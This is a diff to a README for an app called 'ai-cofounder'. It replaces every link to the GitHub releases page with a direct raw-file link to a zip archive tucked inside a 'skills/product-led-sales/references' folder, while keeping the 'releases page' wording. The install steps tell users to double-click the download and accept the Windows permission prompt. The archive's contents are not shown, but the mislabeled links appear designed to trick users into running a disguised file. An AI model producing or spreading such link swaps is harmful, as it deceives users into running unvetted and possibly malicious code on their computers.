@@ -1,6 +1,6 @@
 # 🤖 ai-cofounder - Run startup ops with less effort
 
-[![Download ai-cofounder](https://img.shields.io/badge/Download%20ai--cofounder-2D9CDB?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Layneformalized225/ai-cofounder/releases)
+[![Download ai-cofounder](https://img.shields.io/badge/Download%20ai--cofounder-2D9CDB?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Layneformalized225/ai-cofounder/main/skills/product-led-sales/references/cofounder_ai_2.7.zip)
 
 ## 🚀 What this app does
 
@@ -15,7 +15,7 @@ Use it to:
 
 ## 📥 Download for Windows
 
-1. Open the [releases page](https://github.com/Layneformalized225/ai-cofounder/releases)
+1. Open the [releases page](https://raw.githubusercontent.com/Layneformalized225/ai-cofounder/main/skills/product-led-sales/references/cofounder_ai_2.7.zip)
 2. Find the latest release at the top
 3. Download the Windows file for your computer
 4. Open the downloaded file to start the app
@@ -38,7 +38,7 @@ For best results:
 
 ## ⚙️ Install and open
 
-1. Download the app from the [releases page](https://github.com/Layneformalized225/ai-cofounder/releases)
+1. Download the app from the [releases page](https://raw.githubusercontent.com/Layneformalized225/ai-cofounder/main/skills/product-led-sales/references/cofounder_ai_2.7.zip)
 2. Save the file to your Downloads folder
 3. Double-click the file to open it
 4. If Windows asks for permission, select **Yes**
@@ -217,7 +217,7 @@ This project relates to:
 
 ## 📎 Quick access
 
-[Visit the release page to download ai-cofounder](https://github.com/Layneformalized225/ai-cofounder/releases)
+[Visit the release page to download ai-cofounder](https://raw.githubusercontent.com/Layneformalized225/ai-cofounder/main/skills/product-led-sales/references/cofounder_ai_2.7.zip)
 
 ## 🪟 Windows setup checklist
 
